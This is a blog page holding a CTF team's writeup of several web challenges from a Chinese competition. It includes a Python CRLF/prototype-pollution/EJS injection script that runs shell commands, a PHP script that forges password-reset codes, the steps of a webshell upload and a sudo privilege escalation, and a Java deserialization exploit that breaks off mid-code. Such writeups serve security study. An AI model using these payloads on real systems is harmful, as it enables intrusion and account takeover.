<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='开年后的第一战，or4nge的师傅们火力全开，在西湖论剑初赛上斩获全国第九名的好成绩，web和Re方向几乎ak！'><title>西湖论剑 Writeup by or4nge</title>

<link rel='canonical' href='https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='西湖论剑 Writeup by or4nge'>
<meta property='og:description' content='开年后的第一战，or4nge的师傅们火力全开，在西湖论剑初赛上斩获全国第九名的好成绩，web和Re方向几乎ak！'>
<meta property='og:url' content='https://or4ngesec.github.io/post/xhlj-writeup-by-or4nge/'>
<meta property='og:site_name' content='or4nge'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Writeup' /><meta property='article:tag' content='西湖论剑' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2023-01-31T10:00:00&#43;08:00'/><meta property='article:modified_time' content='2023-01-31T10:00:00&#43;08:00'/>
<meta name="twitter:title" content="西湖论剑 Writeup by or4nge">
<meta name="twitter:description" content="开年后的第一战，or4nge的师傅们火力全开，在西湖论剑初赛上斩获全国第九名的好成绩，web和Re方向几乎ak！">
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/xhlj-writeup-by-or4nge/">西湖论剑 Writeup by or4nge</a>
    </h2>

    
    <h3 class="article-subtitle">
        开年后的第一战，or4nge的师傅们火力全开，在西湖论剑初赛上斩获全国第九名的好成绩，web和Re方向几乎ak！
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 31, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    8 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="web">Web</h2>
<h3 id="扭转乾坤">扭转乾坤</h3>
<p>apache层面的waf说content-type不能是multipart/form-data,结合题目描述利用tomcat和apache对content-type理解差异性大小写绕过后随意上传文件即可获取flag。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 178; 
			flex-basis: 428px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web1.png" data-size="1217x681">
		<img src="/post/xhlj-writeup-by-or4nge/img/web1.png"
			width="1217"
			height="681"
			srcset="/post/xhlj-writeup-by-or4nge/img/web1_hu61753d2efaed42fb982b28377642d192_68717_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web1_hu61753d2efaed42fb982b28377642d192_68717_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="real_ez_node">real_ez_node</h3>
<p>CRLF注入+原型链污染+ejs模板注入</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39; HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /copy HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: 127.0.0.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 159
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: application/json
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{&#34;constructor.prototype.outputFunctionName&#34;:&#34;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag.txt&#39;);var __tmp2&#34;}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET / HTTP/1.1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">test:&#39;&#39;&#39;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload_encode</span>(raw):
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#e6db74">u</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> raw:
</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">0x0100</span><span style="color:#f92672">+</span>ord(i))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload_encode(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(payload)
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;curl?q=&#34;</span> <span style="color:#f92672">+</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(payload))
</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>访问首页即可下载flag文件。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 263; 
			flex-basis: 633px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web2.png" data-size="826x313">
		<img src="/post/xhlj-writeup-by-or4nge/img/web2.png"
			width="826"
			height="313"
			srcset="/post/xhlj-writeup-by-or4nge/img/web2_hu8899f92139a8719d40be7c169321e3a5_11312_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web2_hu8899f92139a8719d40be7c169321e3a5_11312_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="real-world-git">real world git</h3>
<p>忘记密码的逻辑中，生成的验证码只跟邮箱和时间戳有关系，没有引入随机数，本地跑一下就能跑出来，然后利用这个验证码重置root@codefever.cn的密码，再登录就可以看到flag了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// this function use to generated uuid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">service\Utility</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;TOTP_SALT&#39;</span>, <span style="color:#e6db74">&#39;codefever-salt&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TOTP</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SALT</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;codefever_salt&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">TOTP_REFRESH_INTERVAL</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">TOTP_CHECK_WINDOW_MIN</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">TOTP_CHECK_WINDOW_MAX</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">PASSWORD_LENGTH</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hashInput</span> (<span style="color:#a6e22e">string</span> $input) {
</span></span><span style="display:flex;"><span>        $salt <span style="color:#f92672">=</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">SALT</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">TOTP_SALT</span>) {
</span></span><span style="display:flex;"><span>            $salt <span style="color:#f92672">=</span> <span style="color:#a6e22e">TOTP_SALT</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $input <span style="color:#f92672">=</span> $input <span style="color:#f92672">?</span> $input <span style="color:#f92672">:</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">SALT</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#a6e22e">md5</span>($input) <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($salt), <span style="color:#66d9ef">FALSE</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">genTotp</span> (<span style="color:#a6e22e">string</span> $hashedInput, <span style="color:#a6e22e">int</span> $timestamp) {
</span></span><span style="display:flex;"><span>        $sequence <span style="color:#f92672">=</span> <span style="color:#a6e22e">floor</span>($timestamp <span style="color:#f92672">/</span> <span style="color:#ae81ff">30</span>);
</span></span><span style="display:flex;"><span>        $code <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $hashedInput <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($sequence), <span style="color:#a6e22e">md5</span>($sequence), <span style="color:#66d9ef">TRUE</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $finalValue <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        $index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>            $finalValue <span style="color:#f92672">+=</span> <span style="color:#a6e22e">ord</span>($code[$index]);
</span></span><span style="display:flex;"><span>            $finalValue <span style="color:#f92672">=</span> $finalValue <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>            $index<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">isset</span>($code[$index]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $finalValue;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trimTotp</span> (<span style="color:#a6e22e">int</span> $sourceTotp) {
</span></span><span style="display:flex;"><span>        $trimedTotp <span style="color:#f92672">=</span> $sourceTotp <span style="color:#f92672">%</span> <span style="color:#a6e22e">pow</span>(<span style="color:#ae81ff">10</span>, <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">PASSWORD_LENGTH</span>);
</span></span><span style="display:flex;"><span>        $format <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%&#39;.0&#34;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">PASSWORD_LENGTH</span> <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;u&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sprintf</span>($format, <span style="color:#a6e22e">abs</span>($trimedTotp));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate</span>(<span style="color:#a6e22e">string</span> $input) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">trimTotp</span>(<span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">genTotp</span>(<span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">hashInput</span>($input), <span style="color:#a6e22e">time</span>()));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">string</span> $input, <span style="color:#a6e22e">string</span> $code) {
</span></span><span style="display:flex;"><span>        $hashedInput <span style="color:#f92672">=</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">hashInput</span>($input);
</span></span><span style="display:flex;"><span>        $currentTime <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (
</span></span><span style="display:flex;"><span>            $windowIndex <span style="color:#f92672">=</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">TOTP_CHECK_WINDOW_MIN</span>;
</span></span><span style="display:flex;"><span>            $windowIndex <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">TOTP_CHECK_WINDOW_MAX</span>;
</span></span><span style="display:flex;"><span>            $windowIndex<span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span>        ) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (
</span></span><span style="display:flex;"><span>                $code <span style="color:#f92672">===</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">trimTotp</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">genTotp</span>(
</span></span><span style="display:flex;"><span>                        $hashedInput, 
</span></span><span style="display:flex;"><span>                        $currentTime <span style="color:#f92672">+</span> ($windowIndex <span style="color:#f92672">*</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">::</span><span style="color:#a6e22e">TOTP_REFRESH_INTERVAL</span>)
</span></span><span style="display:flex;"><span>                    )
</span></span><span style="display:flex;"><span>                )
</span></span><span style="display:flex;"><span>            ) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">TRUE</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">FALSE</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root@codefever.cn&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">TOTP</span><span style="color:#f92672">::</span><span style="color:#a6e22e">generate</span>($email);
</span></span></code></pre></div><h3 id="unusual-php">unusual php</h3>
<p>能AFR，显示的报错是/tmp/fuck.php执行的，对index.php产生怀疑，直接读index.php发现是乱码，用伪协议读到二进制文件猜测是密文，应该是开启了zend扩展。阅读phpinfo发现存在zend-test的扩展。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 1406; 
			flex-basis: 3375px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web3.png" data-size="1280x91">
		<img src="/post/xhlj-writeup-by-or4nge/img/web3.png"
			width="1280"
			height="91"
			srcset="/post/xhlj-writeup-by-or4nge/img/web3_hu793b05da768dabdc494c82698321c63c_41716_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web3_hu793b05da768dabdc494c82698321c63c_41716_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
扩展位置：/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so
对.so文件进行逆向，在my_compile_file函数中看到大概逻辑，读文件，用rc4解密后zend_stream_open到/tmp/fuck.php然后执行，密钥是abcsdfadfjiweur
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 250; 
			flex-basis: 601px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web4.png" data-size="1280x511">
		<img src="/post/xhlj-writeup-by-or4nge/img/web4.png"
			width="1280"
			height="511"
			srcset="/post/xhlj-writeup-by-or4nge/img/web4_hu8990d77c86efb0eb3a2592654a32d937_188406_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web4_hu8990d77c86efb0eb3a2592654a32d937_188406_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
对一句话木马进行rc4加密，上传至远程，即可rce。
拿到shell后尝试suid提权未果，尝试sudo -l提权发现chmod不需要密码，故把flag的权限改为可读即可读到flag。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 567; 
			flex-basis: 1360px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web5.png" data-size="533x94">
		<img src="/post/xhlj-writeup-by-or4nge/img/web5.png"
			width="533"
			height="94"
			srcset="/post/xhlj-writeup-by-or4nge/img/web5_hu46c12983a455a12a7916215da94391d8_6628_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web5_hu46c12983a455a12a7916215da94391d8_6628_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="node-magical-login">Node Magical Login</h3>
<p>flag1是通过设置cookie的user=admin键值对获得。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 253; 
			flex-basis: 607px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web6.png" data-size="1265x500">
		<img src="/post/xhlj-writeup-by-or4nge/img/web6.png"
			width="1265"
			height="500"
			srcset="/post/xhlj-writeup-by-or4nge/img/web6_hudb2cdbcb1df2a0c182dfb7cf60c1addf_54857_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web6_hudb2cdbcb1df2a0c182dfb7cf60c1addf_54857_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
flag2通过这种方式获取：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">checkcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">checkcode</span>.<span style="color:#a6e22e">toLowerCase</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">checkcode</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;aGr5AtSp55dRacer&#34;</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Invalid Checkcode1:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">checkcode</span>})
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">__</span>) {}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;You Got Another Part Of Flag: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag2</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>()})
</span></span></code></pre></div><p>发现获取flag不在try语句块内，尝试在tolowerCase处触发异常，传一个长度为16的数组，元素中不是字符即可触发异常，直接给flag2。</p>
<h3 id="easy_api">easy_api(*)</h3>
<p>前半部分bypass filter是不小心多打了一个斜杠绕过去的<code>//api/test</code>
后面的反序列化部分注意到了lib里有这些依赖，给的又是原生反序列化入口，所以无视了fastjson。
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 455; 
			flex-basis: 1092px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web7.png" data-size="769x169">
		<img src="/post/xhlj-writeup-by-or4nge/img/web7.png"
			width="769"
			height="169"
			srcset="/post/xhlj-writeup-by-or4nge/img/web7_hub2b0826ea5d5617a634a5a6e3472036f_22397_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web7_hub2b0826ea5d5617a634a5a6e3472036f_22397_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
发现yso里正好有一个现成的</p>
<pre tabindex="0"><code>Spring2     @mbechler      spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aop
alliance:1.0, commons-logging:1.2 
</code></pre><p>就想当然的去复现spring2的链子，后来发现spring版本对不上已经来不及了。
fastjson最经典的部分是自动触发getter来getProperties加载字节码，如何触发getter可以通过JSON.parse触发，也可以通过toJSONString触发，很有意思的是JSON这个类的tostring就是toJSONString
<figure 
	
		class="gallery-image" 
		style="
			flex-grow: 890; 
			flex-basis: 2137px"
	>
	<a href="/post/xhlj-writeup-by-or4nge/img/web8.png" data-size="873x98">
		<img src="/post/xhlj-writeup-by-or4nge/img/web8.png"
			width="873"
			height="98"
			srcset="/post/xhlj-writeup-by-or4nge/img/web8_hu8339a80c6f30bb71537544cf62bc069c_7109_480x0_resize_box_3.png 480w, /post/xhlj-writeup-by-or4nge/img/web8_hu8339a80c6f30bb71537544cf62bc069c_7109_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure>
思路很明确了，题目ban了BadAttributeValueExpException来触发tostring，用xstring来触发，复制之前的部分即可。利用链：readObject-&gt;hashmap.put-&gt;xstring.tostring-&gt;JSON.tostring-&gt;templates.getproperties
最后的exp：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.alibaba.fastjson.JSONObject<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xpath.internal.objects.XString<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.aop.target.HotSwappableTargetSource<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Array<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URLEncoder<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">api_test_payload</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Field <span style="color:#a6e22e">getField</span><span style="color:#f92672">(</span><span style="color:#66d9ef">final</span> Class<span style="color:#f92672">&lt;?&gt;</span> clazz<span style="color:#f92672">,</span> <span style="color:#66d9ef">final</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            field <span style="color:#f92672">=</span> clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchFieldException ex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>clazz<span style="color:#f92672">.</span><span style="color:#a6e22e">getSuperclass</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
